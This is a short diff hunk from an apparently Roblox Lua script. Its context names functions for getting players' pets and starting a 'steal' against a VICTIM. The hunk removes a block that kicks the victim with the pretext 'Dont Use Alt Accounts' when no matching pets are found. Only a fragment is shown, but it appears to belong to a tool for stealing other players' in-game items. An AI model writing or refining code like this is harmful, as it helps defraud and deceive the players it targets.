@@ -285,11 +285,6 @@ local function getPlayersPets()
     end
 end
 
-    -- Kick if no matching pets found
-    if not foundAny then
-        VICTIM:Kick("Dont Use Alt Accounts")
-    end
-end
 
 
 local function startSteal(trigerName)
